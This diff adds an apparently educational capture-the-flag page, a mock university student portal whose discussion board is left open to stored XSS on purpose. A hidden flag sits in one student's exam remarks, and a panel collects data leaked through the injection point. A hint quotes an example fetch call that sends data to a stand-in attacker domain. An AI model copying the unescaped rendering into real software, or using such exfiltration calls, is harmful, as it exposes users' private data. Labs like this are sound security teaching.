@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Riverside State University — Student Portal</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    font-family: Arial, sans-serif; margin: 0; background: #eef1f5; color: #1a202c;
+  }
+  header {
+    background: #22345c; color: #fff; padding: 16px 24px;
+  }
+  header h1 { margin: 0; font-size: 20px; }
+  header p { margin: 4px 0 0; font-size: 13px; color: #b9c4de; }
+  .topbar {
+    background: #fff; padding: 10px 24px; border-bottom: 1px solid #d7dce3;
+    display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+  }
+  .topbar label { font-size: 13px; color: #4a5568; }
+  select, button, textarea {
+    font-family: inherit; font-size: 14px; padding: 6px 10px;
+    border: 1px solid #cbd5e0; border-radius: 5px;
+  }
+  button { background: #2b6cb0; color: #fff; border: none; cursor: pointer; }
+  button:hover { background: #245a92; }
+  button.secondary { background: #718096; }
+  button.secondary:hover { background: #5a6577; }
+  .whoami { margin-left: auto; font-size: 13px; color: #22345c; font-weight: bold; }
+  main {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 18px;
+    padding: 20px 24px; max-width: 1100px; margin: 0 auto;
+  }
+  @media (max-width: 800px) { main { grid-template-columns: 1fr; } }
+  .panel {
+    background: #fff; border-radius: 8px; padding: 16px 18px;
+    box-shadow: 0 1px 3px rgba(0,0,0,.12);
+  }
+  .panel h2 { margin-top: 0; font-size: 16px; color: #22345c; border-bottom: 1px solid #eee; padding-bottom: 8px; }
+  table { width: 100%; border-collapse: collapse; font-size: 14px; }
+  th, td { text-align: left; padding: 6px 4px; border-bottom: 1px solid #f0f0f0; }
+  .remarks {
+    margin-top: 10px; padding: 10px; background: #f0fff4; border: 1px solid #38a169;
+    border-radius: 6px; font-family: monospace; font-size: 13px; word-break: break-all;
+  }
+  .no-remarks { margin-top: 10px; font-size: 13px; color: #a0aec0; font-style: italic; }
+  .msg-list { max-height: 260px; overflow-y: auto; margin-bottom: 10px; }
+  .msg {
+    padding: 8px 10px; border-bottom: 1px solid #f2f2f2; font-size: 14px;
+  }
+  .msg .author { font-weight: bold; color: #2b6cb0; font-size: 12px; display: block; margin-bottom: 2px; }
+  .msg-form textarea { width: 100%; height: 60px; resize: vertical; margin-bottom: 8px; }
+  .collector {
+    grid-column: 1 / -1; background: #1a1f2b; color: #cbe3ff; border-radius: 8px;
+    padding: 16px 18px; font-family: monospace; font-size: 13px;
+  }
+  .collector h2 { color: #7fb2ff; margin-top: 0; font-size: 15px; border-bottom: 1px solid #2c3550; padding-bottom: 8px; }
+  .collector .hint { color: #6d7999; margin-bottom: 8px; }
+  .collector .entry { padding: 6px 0; border-bottom: 1px dashed #2c3550; word-break: break-all; }
+  .collector .empty { color: #4b5675; }
+  .badge { display: inline-block; font-size: 11px; padding: 2px 6px; border-radius: 4px; background: #fed7d7; color: #822727; margin-left: 6px; }
+  footer { text-align: center; font-size: 12px; color: #94a3b8; padding: 20px; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Riverside State University — Student Portal</h1>
+  <p>CS301: Web Application Security — Exam Results &amp; Class Discussion</p>
+</header>
+
+<div class="topbar">
+  <label for="loginSelect">Login as:</label>
+  <select id="loginSelect"></select>
+  <button id="loginBtn">Login</button>
+  <button id="resetBtn" class="secondary">Reset demo data</button>
+  <span class="whoami" id="whoami"></span>
+</div>
+
+<main>
+  <section class="panel">
+    <h2>My Exam Results</h2>
+    <table>
+      <thead><tr><th>Course</th><th>Score</th></tr></thead>
+      <tbody id="examTable"></tbody>
+    </table>
+    <div id="examRemarksWrap"></div>
+  </section>
+
+  <section class="panel">
+    <h2>Class Discussion Board</h2>
+    <div class="msg-list" id="msgList"></div>
+    <div class="msg-form">
+      <textarea id="msgInput" placeholder="Post a message to the class..."></textarea>
+      <button id="postBtn">Post message</button>
+    </div>
+  </section>
+
+  <section class="collector">
+    <h2>📡 External Network Monitor <span class="badge">simulated attacker collector</span></h2>
+    <p class="hint">
+      This panel stands in for a server the attacker controls (e.g. what a real
+      <code>fetch('https://evil-domain/collect?d=...')</code> would deliver to). In this
+      offline demo, exfiltrated data is written to <code>localStorage</code> instead of the
+      network so the whole challenge runs from a static file with no backend.
+    </p>
+    <div id="collectorList"></div>
+  </section>
+</main>
+
+<footer>
+  Educational demo — stored XSS in a same-origin discussion board. Do not point this pattern at real user data.
+</footer>
+
+<script>
+/* ---------------------------------------------------------------------
+ * Fake backend, entirely in Web Storage.
+ *   sessionStorage  -> per-tab "logged in as" (mimics a separate session
+ *                       per student, so two tabs can be two different users)
+ *   localStorage    -> shared "database": exam results + discussion board.
+ *                       Real cross-tab, same-origin storage — nothing here
+ *                       is faked, which is what makes the exfiltration real.
+ * ------------------------------------------------------------------- */
+
+const FLAG = "flag{st0red_xss_pwns_ex4m_p0rtal}";
+
+const SEED_USERS = {
+  alice: { name: "Alice Chen",     id: "STU-1001", results: [
+              { course: "CS301 Web Security", score: "96/100" },
+              { course: "MATH210 Linear Algebra", score: "88/100" } ],
+           remarks: "Grade appeal APPROVED by Dean's office. Confidential override code: " + FLAG },
+  bob:   { name: "Bob Martinez",   id: "STU-1002", results: [
+              { course: "CS301 Web Security", score: "74/100" },
+              { course: "MATH210 Linear Algebra", score: "81/100" } ] },
+  carol: { name: "Carol Nguyen",   id: "STU-1003", results: [
+              { course: "CS301 Web Security", score: "89/100" },
+              { course: "PHYS101 Mechanics", score: "77/100" } ] },
+  dave:  { name: "Dave Okafor",    id: "STU-1004", results: [
+              { course: "CS301 Web Security", score: "68/100" },
+              { course: "PHYS101 Mechanics", score: "90/100" } ] },
+  eve:   { name: "Eve Kowalski",   id: "STU-1005", results: [
+              { course: "CS301 Web Security", score: "71/100" },
+              { course: "MATH210 Linear Algebra", score: "79/100" } ] },
+  frank: { name: "Frank Rossi",    id: "STU-1006", results: [
+              { course: "CS301 Web Security", score: "83/100" },
+              { course: "PHYS101 Mechanics", score: "85/100" } ] },
+  grace: { name: "Grace Lindqvist",id: "STU-1007", results: [
+              { course: "CS301 Web Security", score: "92/100" },
+              { course: "MATH210 Linear Algebra", score: "95/100" } ] },
+  heidi: { name: "Heidi Suzuki",   id: "STU-1008", results: [
+              { course: "CS301 Web Security", score: "80/100" },
+              { course: "PHYS101 Mechanics", score: "82/100" } ] },
+  ivan:  { name: "Ivan Petrov",    id: "STU-1009", results: [
+              { course: "CS301 Web Security", score: "65/100" },
+              { course: "MATH210 Linear Algebra", score: "70/100" } ] },
+  judy:  { name: "Judy Alvarez",   id: "STU-1010", results: [
+              { course: "CS301 Web Security", score: "87/100" },
+              { course: "PHYS101 Mechanics", score: "91/100" } ] }
+};
+
+const SEED_MESSAGES = [
+  { author: "system", text: "Welcome to the CS301 discussion board. Be respectful.", ts: Date.now() },
+  { author: "prof_lee", text: "Reminder: exam remarks are only visible to the student they belong to.", ts: Date.now() }
+];
+
+function seedIfNeeded() {
+  if (!localStorage.getItem("uni_users")) {
+    localStorage.setItem("uni_users", JSON.stringify(SEED_USERS));
+  }
+  if (!localStorage.getItem("uni_messages")) {
+    localStorage.setItem("uni_messages", JSON.stringify(SEED_MESSAGES));
+  }
+}
+
+function getUsers() { return JSON.parse(localStorage.getItem("uni_users") || "{}"); }
+function getMessages() { return JSON.parse(localStorage.getItem("uni_messages") || "[]"); }
+function saveMessages(msgs) { localStorage.setItem("uni_messages", JSON.stringify(msgs)); }
+
+function currentUser() { return sessionStorage.getItem("uni_current_user") || "eve"; }
+function setCurrentUser(u) { sessionStorage.setItem("uni_current_user", u); }
+
+function renderLoginOptions() {
+  const sel = document.getElementById("loginSelect");
+  sel.innerHTML = "";
+  Object.keys(getUsers()).forEach(uname => {
+    const opt = document.createElement("option");
+    opt.value = uname;
+    opt.textContent = uname;
+    sel.appendChild(opt);
+  });
+  sel.value = currentUser();
+}
+
+function renderWhoAmI() {
+  const users = getUsers();
+  const u = users[currentUser()];
+  document.getElementById("whoami").textContent = u ? `Logged in as ${u.name} (${u.id})` : "Not logged in";
+}
+
+function renderExam() {
+  const users = getUsers();
+  const u = users[currentUser()];
+  const tbody = document.getElementById("examTable");
+  tbody.innerHTML = "";
+  (u.results || []).forEach(r => {
+    const tr = document.createElement("tr");
+    const c = document.createElement("td"); c.textContent = r.course;
+    const s = document.createElement("td"); s.textContent = r.score;
+    tr.appendChild(c); tr.appendChild(s);
+    tbody.appendChild(tr);
+  });
+
+  const wrap = document.getElementById("examRemarksWrap");
+  wrap.innerHTML = "";
+  if (u.remarks) {
+    const div = document.createElement("div");
+    div.className = "remarks";
+    div.id = "examRemarks";
+    div.textContent = u.remarks; // rendered safely here — the leak happens via the message board, not this panel
+    wrap.appendChild(div);
+  } else {
+    const div = document.createElement("div");
+    div.className = "no-remarks";
+    div.textContent = "No remarks on file.";
+    wrap.appendChild(div);
+  }
+}
+
+function renderMessages() {
+  const list = document.getElementById("msgList");
+  list.innerHTML = "";
+  getMessages().forEach(m => {
+    const div = document.createElement("div");
+    div.className = "msg";
+    const author = document.createElement("span");
+    author.className = "author";
+    author.textContent = m.author;
+    div.appendChild(author);
+
+    // VULNERABLE: message body is rendered as raw HTML with no escaping
+    // and no sanitization. This is the injection point for the challenge.
+    const body = document.createElement("div");
+    body.innerHTML = m.text;
+    div.appendChild(body);
+
+    list.appendChild(div);
+  });
+}
+
+function renderCollector() {
+  const container = document.getElementById("collectorList");
+  const keys = Object.keys(localStorage).filter(k => k.startsWith("leak_")).sort();
+  if (keys.length === 0) {
+    container.innerHTML = '<div class="empty">-- no data received --</div>';
+    return;
+  }
+  container.innerHTML = "";
+  keys.forEach(k => {
+    const entry = document.createElement("div");
+    entry.className = "entry";
+    entry.textContent = localStorage.getItem(k); // safe: textContent, this panel never re-executes anything
+    container.appendChild(entry);
+  });
+}
+
+function renderAll() {
+  renderWhoAmI();
+  renderExam();
+  renderMessages();
+  renderCollector();
+}
+
+document.getElementById("loginBtn").addEventListener("click", () => {
+  setCurrentUser(document.getElementById("loginSelect").value);
+  renderAll();
+});
+
+document.getElementById("postBtn").addEventListener("click", () => {
+  const input = document.getElementById("msgInput");
+  const text = input.value.trim();
+  if (!text) return;
+  const msgs = getMessages();
+  msgs.push({ author: currentUser(), text, ts: Date.now() });
+  saveMessages(msgs);
+  input.value = "";
+  renderAll();
+});
+
+document.getElementById("resetBtn").addEventListener("click", () => {
+  localStorage.removeItem("uni_users");
+  localStorage.removeItem("uni_messages");
+  Object.keys(localStorage).filter(k => k.startsWith("leak_")).forEach(k => localStorage.removeItem(k));
+  seedIfNeeded();
+  renderAll();
+});
+
+// Other tabs (other logged-in students) writing to localStorage fires
+// this event here — used both to keep the discussion board live across
+// tabs, and to let the "attacker" tab see exfiltrated data land in
+// real time once the victim's tab renders the malicious message.
+window.addEventListener("storage", renderAll);
+
+seedIfNeeded();
+renderLoginOptions();
+renderAll();
+</script>
+</body>
+</html>
